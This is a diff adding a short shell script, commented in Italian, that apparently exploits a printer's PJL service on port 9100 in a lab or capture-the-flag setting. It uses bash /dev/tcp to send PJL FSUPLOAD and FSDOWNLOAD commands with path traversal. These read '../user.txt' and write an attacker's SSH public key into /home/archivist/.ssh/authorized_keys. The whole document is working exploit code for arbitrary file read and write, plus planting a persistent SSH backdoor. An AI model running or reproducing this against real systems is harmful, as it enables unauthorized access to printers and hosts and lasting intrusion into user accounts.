@@ -1,0 +1,20 @@
+exec 3<>/dev/tcp/127.0.0.1/9100
+printf "\x1b%%-12345X@PJL FSUPLOAD NAME=\"../user.txt\"\r\n\x1b%%-12345X" >&3
+cat <&3
+exec 3>&-
+
+
+# 1. Apri la connessione sul file descriptor 3
+exec 3<>/dev/tcp/127.0.0.1/9100
+
+# 2. Invia l'intestazione PJL specificando la dimensione esatta
+printf "@PJL FSDOWNLOAD NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE=394\r\n" >&3
+
+# 3. Invia la tua chiave SSH pubblica seguita da un ritorno a capo
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2q/mmskjxq9KNuSl6+R1WKKMqEpjfCM+n9g+ZAzlU/bTtVivTaPfLTNCFsMl43ec1Py8dVlxnRgc7iPL1VHaVOhdWhhUXxD4QCSFRBhbaF3NwJ+8VKr8yb6kT18bbqHuQOuNfW3sXBW2ExwrpoCyB4aYikvjAzv68wqXMWNs8hu/UlL5aQFHuFvPScv6Qit/uh7Ln/WQQXqXB9k9HLcMy2lUyIPrS76qNiwPna2Z/yljIhd90BlN/Zrev8AXUf+hytNd0m3qBsOG2kF7jaNWDabaVcn5gSc5J3ET3F8l2WP+92ySHc6iE4vV8CX65ZDs/dL+cZio6mK5MN0QUP2DF ale@ShadowPC" >&3
+
+# 4. Leggi la risposta del server (dovrebbe restituire OK)
+cat <&3
+
+# 5. Chiudi il file descriptor
+exec 3>&-
